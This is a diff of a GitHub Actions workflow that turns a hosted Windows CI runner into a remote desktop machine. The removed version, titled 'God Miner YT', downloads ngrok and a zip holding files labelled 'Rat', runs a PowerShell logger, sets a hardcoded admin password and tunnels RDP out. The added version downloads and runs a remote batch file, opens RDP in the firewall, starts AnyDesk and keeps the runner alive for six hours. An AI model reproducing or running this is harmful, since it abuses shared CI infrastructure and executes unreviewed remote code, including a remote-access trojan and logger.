@@ -1,35 +1,26 @@
-name: God Miner YT
+name: Windows - Anydesk RDP
 
 on: [push, workflow_dispatch]
 
 jobs:
   build:
-
+    name: Built Connection to KSP_TECH
     runs-on: windows-latest
-
+    timeout-minutes: 9999
+    
     steps:
-    - name: Download
-      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-    - name: Extract
-      run: Expand-Archive ngrok.zip
-    - name: DownloadRat
-      run: Invoke-WebRequest https://raw.githubusercontent.com/khalid-ofcl/rdp-files/main/rdp_new.zip -OutFile rdp.zip
-    - name: ExtractRat
-      run: Expand-Archive rdp.zip
-    - name: RunYT
-      run: start .\rdp\start.bat
-    - name: RunRat
-      run: start powershell {.\rdp\logger.ps1}
-    - name: Auth
-      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
-      env:
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
-    - name: Enable TS
-      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "B@ss542543" -Force)
-    - name: Create Tunnel
-      run: .\ngrok\ngrok.exe tcp 3389
-    - name: RunTime
-      run: .\rdp\uptime.ps1
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khalid-ofcl/rdp-files/main/ksp_tech_rdp.bat" -OutFile "ksp_tech_rdp.bat"
+          cmd /c ksp_tech_rdp.bat
+          
+      - name: Enable TS
+        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+      - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+      - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+
+      - name: Log In To AnyDesk
+        run: cmd /c start_rdp.bat
+
+      - name: Time Counter
+        run: Start-Sleep -Seconds 21600
